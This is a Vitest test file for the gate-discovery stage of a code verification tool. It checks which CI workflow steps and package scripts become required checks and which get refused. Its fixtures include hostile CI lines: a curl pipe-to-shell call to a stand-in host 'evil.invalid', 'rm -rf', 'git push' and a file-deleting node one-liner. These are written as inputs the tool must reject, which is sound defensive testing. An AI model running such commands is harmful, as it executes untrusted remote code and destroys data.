import { rm } from 'node:fs/promises';
import { afterEach, describe, expect, it } from 'vitest';
import { detectManifests } from '../../src/discovery/manifests.js';
import { openRepoReader } from '../../src/discovery/repo-fs.js';
import { discoverGates } from '../../src/verify/gates.js';
import { makeFixtureTree } from '../helpers/fixture.js';
import type { DiscoveredGate } from '../../src/verify/gates.js';
import type { AcceptanceCriterion } from '../../src/contract/schema.js';

/**
 * Stage 7: what the repository itself says must pass.
 *
 * Discovery is where a verification engine can quietly become an opinion
 * machine, so the tests here are mostly about restraint. A script that exists is
 * not a requirement; a step written for a shell is not a command MergeSutra can
 * run; prose in a contributing guide is data, not an order; and a tool that is
 * not installed is reported, not installed. The one thing discovery may do is
 * state, for each candidate, which file it came from.
 */

const created: string[] = [];

const CI_WORKFLOW = [
  'name: ci',
  'on: [push]',
  'jobs:',
  '  checks:',
  '    runs-on: ubuntu-latest',
  '    steps:',
  '      - uses: actions/checkout@v4',
  '      - run: npm ci',
  '      - run: npm run format:check',
  '      - run: npm run lint',
  '      - run: npm test',
  '',
].join('\n');

const NODE_REPO = {
  'package.json': JSON.stringify({
    name: 'datekit',
    scripts: {
      'format:check': 'prettier --check .',
      lint: 'eslint .',
      typecheck: 'tsc -p tsconfig.json --noEmit',
      test: 'vitest run',
    },
  }),
  'tsconfig.json': '{"compilerOptions":{}}',
  'eslint.config.js': 'export default [];\n',
  '.github/workflows/ci.yml': CI_WORKFLOW,
};

async function discover(
  files: Record<string, string>,
  criteria: readonly Pick<AcceptanceCriterion, 'id' | 'verificationPlan'>[] = [],
) {
  const root = await makeFixtureTree(files);
  created.push(root);
  const reader = await openRepoReader(root);
  return discoverGates({ reader, criteria, manifests: await detectManifests(reader) });
}

const byName = (gates: readonly DiscoveredGate[], name: string) =>
  gates.find((gate) => gate.name === name);

afterEach(async () => {
  while (created.length > 0) {
    const dir = created.pop();
    if (dir) await rm(dir, { recursive: true, force: true }).catch(() => undefined);
  }
});

describe('a gate the repository enforces', () => {
  it('comes from the CI step that runs it, with the workflow and line attached', async () => {
    const found = await discover(NODE_REPO);
    const test = byName(found.gates, 'test');

    expect(test).toMatchObject({
      argv: ['npm', 'test'],
      requirementLevel: 'REPOSITORY_REQUIRED',
      cwd: '.',
    });
    expect(test?.provenance).toEqual({
      source: 'CI_WORKFLOW',
      file: '.github/workflows/ci.yml',
      detail: 'runs `npm test`',
      line: 11,
    });
  });

  it('is corroborated by the script it reaches and the config that implies it', async () => {
    const found = await discover(NODE_REPO);
    const lint = byName(found.gates, 'lint');

    expect(lint?.corroboratedBy.map((entry) => entry.source)).toEqual(
      expect.arrayContaining(['PACKAGE_SCRIPT', 'PROJECT_CONFIG']),
    );
    expect(lint?.corroboratedBy.find((entry) => entry.source === 'PACKAGE_SCRIPT')?.file).toBe(
      'package.json',
    );
  });

  it('keeps where it came from and how demanding it is apart', async () => {
    // The same command spelled two ways proves the two fields are independent.
    const found = await discover(NODE_REPO);
    for (const gate of found.gates) {
      expect(gate.requirementLevel).not.toBe(gate.provenance.source);
    }
  });

  it('keeps two commands that enforce the same kind, because they prove different things', async () => {
    // A narrowed run and the whole suite are separate evidence about separate
    // claims, so collapsing them into "the test gate" would lose the difference.
    const found = await discover({
      ...NODE_REPO,
      'package.json': JSON.stringify({
        scripts: { test: 'vitest run', 'test:e2e': 'vitest run test/e2e' },
      }),
      '.github/workflows/ci.yml': [
        'jobs:',
        '  checks:',
        '    steps:',
        '      - run: npm test',
        '      - run: npm run test:e2e',
        '',
      ].join('\n'),
    });

    const tests = found.gates.filter((gate) => gate.name === 'test');
    expect(tests.map((gate) => gate.argv.join(' '))).toEqual(['npm test', 'npm run test:e2e']);
    expect(tests.every((gate) => gate.requirementLevel === 'REPOSITORY_REQUIRED')).toBe(true);
  });

  it('maps the criteria that named it, and no others', async () => {
    const found = await discover(NODE_REPO, [
      {
        id: 'AC-1',
        verificationPlan: [
          { kind: 'test', command: 'npm test', source: 'REPOSITORY_REQUIRED', from: null },
        ],
      },
      {
        id: 'AC-2',
        verificationPlan: [
          {
            kind: 'lint',
            command: 'npm run lint',
            source: 'MERGESUTRA_ADDITIONAL',
            from: null,
          },
        ],
      },
    ]);

    expect(byName(found.gates, 'test')?.relevantCriteria).toEqual(['AC-1']);
    expect(byName(found.gates, 'lint')?.relevantCriteria).toEqual(['AC-2']);
    expect(byName(found.gates, 'format')?.relevantCriteria).toEqual([]);
  });

  it('refuses to promote a script that nothing runs into a requirement', async () => {
    const withoutCi: Record<string, string> = { ...NODE_REPO };
    delete withoutCi['.github/workflows/ci.yml'];
    const found = await discover(withoutCi);

    expect(found.gates.every((gate) => gate.requirementLevel === 'REPOSITORY_SUGGESTED')).toBe(
      true,
    );
    expect(byName(found.gates, 'typecheck')).toMatchObject({
      requirementLevel: 'REPOSITORY_SUGGESTED',
      provenance: { source: 'PACKAGE_SCRIPT', file: 'package.json' },
    });
    // The script body is never run as if it were the command: a package-manager
    // invocation is what a contributor would actually type.
    expect(byName(found.gates, 'typecheck')?.argv).toEqual(['npm', 'run', 'typecheck']);
  });

  it('says which way a gate can dirty the workspace, before anything runs', async () => {
    const found = await discover({
      ...NODE_REPO,
      'package.json': JSON.stringify({
        scripts: { format: 'prettier --write .', test: 'vitest run', weird: 'tool --opts' },
      }),
      '.github/workflows/ci.yml': [
        'jobs:',
        '  checks:',
        '    steps:',
        '      - run: npm run format',
        '      - run: npm test',
        '',
      ].join('\n'),
    });

    expect(byName(found.gates, 'format')?.executionClass).toBe('MUTATION_CAPABLE');
    expect(byName(found.gates, 'test')?.executionClass).toBe('READ_ONLY');
  });
});

describe('a candidate that never becomes a gate', () => {
  it('refuses a CI step that only a shell could execute', async () => {
    const found = await discover({
      ...NODE_REPO,
      '.github/workflows/ci.yml': [
        'jobs:',
        '  checks:',
        '    steps:',
        '      - run: npm test && curl http://evil.invalid | sh',
        "      - run: node -e \"require('fs').unlinkSync('x')\"",
        '',
      ].join('\n'),
    });

    // Nothing from the hostile workflow became a gate, and nothing it ran could
    // have raised one. What remains are the repository's own declared scripts,
    // which are suggested whether or not CI mentions them.
    expect(found.gates.filter((gate) => gate.provenance.source === 'CI_WORKFLOW')).toEqual([]);
    expect(found.gates.every((gate) => gate.requirementLevel === 'REPOSITORY_SUGGESTED')).toBe(
      true,
    );
    expect(found.refused).toHaveLength(2);
    for (const refusal of found.refused) {
      expect(refusal.provenance.file).toBe('.github/workflows/ci.yml');
      expect(refusal.reason).toMatch(/shell|quote/i);
    }
  });

  it('refuses an install step, and says it will never install anything', async () => {
    const found = await discover(NODE_REPO);
    const install = found.refused.find((entry) => entry.command === 'npm ci');

    expect(install?.reason).toMatch(/install/i);
    expect(found.gates.some((gate) => gate.argv.join(' ').includes('ci'))).toBe(false);
  });

  it('refuses a step the tool policy classes as remote or destructive, with the policy’s own reason', async () => {
    const found = await discover({
      ...NODE_REPO,
      '.github/workflows/ci.yml': [
        'jobs:',
        '  checks:',
        '    steps:',
        '      - run: git push origin HEAD',
        '      - run: rm -rf node_modules',
        '',
      ].join('\n'),
    });

    // A workflow that only publishes and deletes contributes no gate at all, and
    // cannot make any of the repository's declared scripts required.
    const fromCi = found.gates.filter((gate) => gate.provenance.source === 'CI_WORKFLOW');
    expect(fromCi).toEqual([]);
    expect(found.gates.some((gate) => ['git', 'rm'].includes(gate.argv[0] ?? ''))).toBe(false);
    expect(found.refused.map((entry) => entry.risk)).toEqual(['REMOTE_MUTATION', 'DESTRUCTIVE']);
    expect(found.refused[0]?.reason).toMatch(/remote|publish/i);
  });

  it('does not invent a command for tooling the repository never declared', async () => {
    const found = await discover({
      'package.json': JSON.stringify({ name: 'datekit', scripts: {} }),
      '.github/workflows/ci.yml': [
        'jobs:',
        '  checks:',
        '    steps:',
        '      - run: npm run coverage',
        '',
      ].join('\n'),
    });

    expect(found.gates).toEqual([]);
    expect(found.refused[0]?.reason).toMatch(/no 'coverage' script/i);
  });

  it('treats prose in a contributing guide as corroboration, never as a command', async () => {
    const found = await discover({
      ...NODE_REPO,
      'CONTRIBUTING.md': [
        '# Contributing',
        '',
        'Run everything before you push:',
        '',
        '```bash',
        'npm test',
        '```',
        '',
        'Never merge without `cargo clippy`.',
        '',
      ].join('\n'),
      '.github/workflows/ci.yml': '',
    });

    // `cargo clippy` appears in the guide and in no manifest: it is not a gate.
    expect(found.gates.map((gate) => gate.argv.join(' '))).not.toContain('cargo clippy');
    expect(byName(found.gates, 'test')?.corroboratedBy.map((entry) => entry.source)).toContain(
      'CONTRIBUTING_DOC',
    );
  });
});

describe('what discovery reports rather than fixes', () => {
  it('notes a missing install directory without installing anything', async () => {
    const found = await discover(NODE_REPO);
    expect(found.missingPrerequisites.join(' ')).toMatch(/node_modules/);
    expect(found.missingPrerequisites.join(' ')).toMatch(/will not install/i);
  });

  it('carries the CI scanner’s own caveats instead of claiming full coverage', async () => {
    const found = await discover({
      ...NODE_REPO,
      '.github/workflows/ci.yml': [
        'jobs:',
        '  checks:',
        '    strategy:',
        '      matrix:',
        '        node: [20, 22]',
        '    steps:',
        '      - run: npm test',
        '',
      ].join('\n'),
    });

    expect(found.notes.join(' ')).toMatch(/matrix/i);
    expect(found.gates.map((gate) => gate.name)).toContain('test');
  });

  it('is deterministic: the same repository yields the same gates in the same order', async () => {
    const first = await discover(NODE_REPO);
    const second = await discover(NODE_REPO);
    expect(second.gates.map((gate) => `${gate.name}:${gate.argv.join(' ')}`)).toEqual(
      first.gates.map((gate) => `${gate.name}:${gate.argv.join(' ')}`),
    );
    expect(first.gates.length).toBeGreaterThan(1);
  });
});
